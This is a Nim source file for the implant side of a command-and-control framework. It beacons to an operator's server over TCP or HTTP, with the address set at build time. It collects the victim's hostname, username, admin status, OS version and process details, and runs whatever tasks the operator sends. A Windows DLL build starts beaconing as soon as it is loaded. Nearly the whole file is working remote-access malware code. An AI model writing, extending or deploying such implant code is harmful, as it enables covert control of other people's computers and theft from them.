import std/[os, strutils]
when defined(tcp):
  import std/net
elif defined(http):
  import std/httpclient

import winim/lean, tlv

import modules, communication
import ../clientTasks/index, types

const port {.intdefine.}: int = 1234
const autoConnectTime {.intdefine.}: int = 5000
const ip {.strdefine.}: string = "127.0.0.1"

let app: App = App()

app.ip = ip
app.port = port
app.autoConnectTime = autoConnectTime

when defined(tcp):
  app.socket = newSocket()
elif defined(http):
  app.httpRoot = "http://" & ip & ":" & $port
  app.httpClient = newHttpClient()

var sleepTime = 5

when defined(linux):
    const osType = "linux"
elif defined(windows):
    const osType = "windows"
else:
    const osType = "unknown"

proc handleTask(app: App, taskTLV: string) =
  let p = initParser()
  p.setBuffer(cast[seq[byte]](taskTLV))

  let taskId = p.extractInt32()
  let taskName = p.extractString()
  discard p.extractInt32() # param buf size
  let paramCount = p.extractInt32()
  var params = newSeqOfCap[string](paramCount)

  for _ in 1..paramCount:
    params.add p.extractString()
  
  if taskName == "identify":
    app.identify(
      taskId,
      hostname=hostname(),
      username=username(), 
      isAdmin=areWeAdmin(),
      osType=osType,
      windowsVersionInfo=getwindowosinfo(),
      pid=getCurrentProcessId(),
      pname=getAppFilename()
    )
  elif taskName == "sleep":
    sleepTime = parseInt(params[0])
    app.sendOutput(newTaskOutput(taskId))
  elif taskName == "enumtasks":
    let taskOutput = newTaskOutput(taskId)
    var taskNames: seq[tuple[name: string]] = @[(name: "enumtasks"), (name: "sleep")]
    for task in tasks: taskNames.add (name: task.name)

    let b = initBuilder()
    b.addInt32(cast[int32](len tasks))
    for task in tasks: b.addString(task.name)
    taskOutput.data = b.encodeString()

    app.sendOutput(taskOutput)
  else:
    for cTask in tasks:
      if cTask.name == taskName:
        cTask.execute(app, taskId, params)
        return

    app.unknownTask(taskId, taskName)

proc receiveCommands(app: App) =
  app.connectToC2()
  while true:
    let tasks = app.fetchTasks()
    if tasks == "": continue
    let p = initParser()
    p.setBuffer(cast[seq[byte]](tasks))
    
    let tasksCount = p.extractInt32()
    for _ in 1..tasksCount:
      handleTask app, p.extractString()

    sleep sleepTime*1000

proc beginConnection() =
  app.receiveCommands()

when defined(library) and defined(windows):
  proc NimMain() {.cdecl, importc.}

  proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
    NimMain()
    if fdwReason == DLL_PROCESS_ATTACH: beginConnection()
    return true
else:
  beginConnection()